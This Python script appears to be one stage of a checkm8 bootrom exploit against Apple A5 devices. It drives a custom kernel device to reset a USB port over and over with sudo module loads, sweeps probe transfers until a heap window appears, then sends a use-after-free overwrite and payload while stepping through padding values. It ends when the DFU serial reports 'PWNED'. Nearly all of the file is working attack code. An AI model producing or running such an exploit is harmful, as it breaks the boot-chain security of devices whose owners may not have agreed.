#!/usr/bin/env python3
"""pipe-stage3.py - sweep and fire against the CURRENT sprayed chip state.

Assumes: the pipeline's P1 (619 spray) + S2 + knife-edge already ran on
this chip (sprayed heap survives PR re-entries). No dance needed, no
re-spray. No freshness gate: khubd may be frozen with a pre-spray
zombie; the module->xHC->chip path is live regardless, and the probe
CYCs' halt-recovery walks the ring past stuck kernel TDs themselves.

Loop: PR (chip re-enters, heap survives) -> 4s AA-probe sweep with
readback -> first serve: arm + UAF(pad) + payload + PR -> verify.
Pad advances per fire: 0x6C0 outward in 0x40 steps.
"""
import ctypes
import fcntl
import importlib.util
import os
import struct
import subprocess
import sys
import time

REPO = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
TOOLS = os.path.join(REPO, 'tools')

sp = importlib.util.spec_from_file_location('pwn', os.path.join(TOOLS, 'checkm8-a5-pwn.py'))
P = importlib.util.module_from_spec(sp)
sp.loader.exec_module(P)

IOC_CYC = (1 << 30) | (32 << 16) | (ord('R') << 8) | 5
IOC_STATE = (2 << 30) | (40 << 16) | (ord('R') << 8) | 3
RB_SIZE = 4 + 4 + 0x1000
IOC_RW = (3 << 30) | (RB_SIZE << 16) | (ord('R') << 8) | 7
IOC_PORTRESET = (3 << 30) | (16 << 16) | (ord('R') << 8) | 12

PROBE = bytes([0x80, 0x06, 0x03, 0x03, 0x0A, 0x04, 0x80, 0x00])
CRIT  = bytes([0x80, 0x06, 0x03, 0x03, 0x0A, 0x04, 0x81, 0x00])
UAF   = bytes([0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00])
DNL   = bytes([0x21, 0x01, 0x00, 0x00, 0x00, 0x00, 0xC0, 0x02])


def cyc(fd, setup, data, settle_us=1000):
    arr = (ctypes.c_ubyte * max(len(data), 1)).from_buffer_copy(
        bytes(data) if data else b'\x00')
    txn = struct.pack('<8sIBBHIIQ', bytes(setup), len(data), 1, 1, 0,
                      settle_us, 0, ctypes.addressof(arr))
    try:
        fcntl.ioctl(fd, IOC_CYC, txn, True)
        return 0
    except OSError as e:
        _ = arr
        return -e.errno


def readback(fd, n=16):
    rb = bytearray(RB_SIZE)
    struct.pack_into('<I', rb, 0, n)
    fcntl.ioctl(fd, IOC_RW, rb, True)
    st, = struct.unpack_from('<I', rb, 4)
    return st, bytes(rb[8:8 + n])


def state(fd):
    buf = bytearray(40)
    fcntl.ioctl(fd, IOC_STATE, buf, True)
    return struct.unpack_from('<QIIIIIIII', buf, 0)


def pr_raw():
    subprocess.run(['sudo', '-n', 'insmod', '/tmp/raw0rb/raw0reset.ko',
                    'bdf=0000:04:00.4', 'port=5', 'mode=1'],
                   capture_output=True, timeout=25)
    subprocess.run(['sudo', '-n', 'rmmod', 'raw0reset'],
                   capture_output=True, timeout=15)


def main():
    payload, overwrite = P.load_payloads('classic')
    print('*** pipe-stage3 sweep: payload=%d overwrite=%d ***'
          % (len(payload), len(overwrite)))

    pads = [0x6c0]
    for k in range(1, 28):
        pads += [0x6c0 + 0x40 * k, 0x6c0 - 0x40 * k]
    pads = [p for p in pads if 0x40 <= p <= 0x1000]
    pad_idx = 0

    fd = os.open('/dev/raw0', os.O_RDWR)
    for r in range(120):
        pad = pads[pad_idx % len(pads)]
        print('== round %d (next pad 0x%03x) ==' % (r, pad))
        f = state(fd)
        if not f[5]:
            pr_raw()
            # poll through the attempt epoch: the capture lives only
            # ~100-500ms inside each khubd attempt - a single check
            # lands before or after it and misses every time
            tw = time.time()
            while time.time() - tw < 5.0:
                f = state(fd)
                if f[5]:
                    break
                time.sleep(0.005)
        if not f[5]:
            print('   no capture epoch in 5s')
            continue
        pr_raw()

        t0 = time.time()
        shots = 0
        eio = 0
        served = False
        while time.time() - t0 < 4.0:
            rc = cyc(fd, PROBE, b'\xAA' * 0x80)
            if rc == 0:
                shots += 1
                st, data = readback(fd, 16)
                if data != b'\xAA' * 16:
                    served = True
                    print('   WINDOW (shot %d): %s' % (shots, data.hex()))
                    break
            else:
                eio += 1
                if eio > 6:
                    break
                time.sleep(0.02)
        if not served:
            print('   silent (%d shots, %d eio)' % (shots, eio))
            continue

        print('   FIRE pad=0x%03x' % pad)
        rc = cyc(fd, CRIT, b'\x00' * 0x41)
        st, arm = readback(fd, 32)
        print('   ARM rc=%d rb=%s' % (rc, arm.hex()))
        rc = cyc(fd, UAF, b'\xCC' * pad + overwrite)
        print('   UAF(%dB) rc=%d' % (pad + 64, rc))
        rc = cyc(fd, DNL, b'\xCC' * 0x40 + payload)
        print('   payload rc=%d' % rc)
        pad_idx += 1

        buf = bytearray(struct.pack('<IIII', 1, 0, 0, 0))
        fcntl.ioctl(fd, IOC_PORTRESET, buf, True)
        t0 = time.time()
        pwned = False
        while time.time() - t0 < 10.0:
            serial = P.sysfs_dfu(timeout=2.0)[1]
            if serial:
                print('   serial: %r' % serial)
                pwned = P.PWN_MARKER in serial
                break
            pr_raw()
        if pwned:
            print('*** PWNED DFU - host-only checkm8 A5 achieved '
                  '(pad 0x%03x) ***' % pad)
            os.close(fd)
            return 0
        print('   not pwned - advancing pad')

    print('exhausted rounds')
    os.close(fd)
    return 2


if __name__ == '__main__':
    sys.exit(main())
